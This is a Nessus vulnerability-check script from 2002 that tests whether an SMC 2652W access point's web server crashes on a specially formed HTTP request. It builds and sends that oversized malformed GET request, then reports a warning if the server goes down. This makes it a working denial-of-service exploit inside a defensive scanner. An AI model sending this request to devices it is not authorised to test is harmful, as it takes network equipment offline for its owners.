#
# Copyright 2002 by John Lampe ... j_lampe@bellsouth.net
# BUG FOUND WITH SPIKE 2.7
# See the Nessus Scripts License for details
#
# changes by rd:
# -fill the Host header to work through a transparent proxy
# -use http_is_dead() to determine success of script

if(description)
{
    script_id(11141);
    script_version ("$Revision: 1.8 $");
    name["english"] = "Crash SMC AP";
    script_name(english:name["english"]);
    desc["english"] = "
The remote SMC 2652W Access point web server crashes when sent a 
specially formatted HTTP request.  


Solution: Contact vendor for a fix

Risk factor: Medium";

    script_description(english:desc["english"]);
    summary["english"] = "Crash SMC Access Point";
    script_summary(english:summary["english"]);
    script_category(ACT_DENIAL);
    script_copyright(english:"This script is Copyright (C) 2002 John Lampe...j_lampe@bellsouth.net");
    family["english"] = "Denial of Service";
    script_family(english:family["english"]);
    script_dependencies("find_service.nes");
    script_require_ports("Services/www", 80);
    exit(0);
}

#
# The script code starts here
#
# found with SPIKE 2.7 http://www.immunitysec.com/spike.html
# req string directly horked from SPIKE API

include ("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(http_is_dead(port: port))exit(0);

req = string("GET /", crap(240), ".html?OpenElement&FieldElemFormat=gif HTTP/1.1\r\n");
req = string(req, "Referer: http://localhost/bob\r\n");
req = string(req, "Content-Type: application/x-www-form-urlencoded\r\n");
req = string(req, "Connection: Keep-Alive\r\n");
req = string(req, "Cookie: VARIABLE=FOOBAR; path=/\r\n");
req = string(req, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n");
req = string(req, "Variable: result\r\n");
req = string(req, "Host: ", get_host_name(), "\r\nContent-length: 13\r\n");
req = string(req, "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n");
req = string(req, "Accept-Encoding: gzip\r\nAccept-Language:en\r\nAccept-Charset: iso-8859-1,*,utf-8\r\n\r\n");


soc = http_open_socket(port);
if (soc) {
  send(socket:soc, data:req);
  close(soc);
}


if(http_is_dead(port: port))
{
  security_warning(port);
}





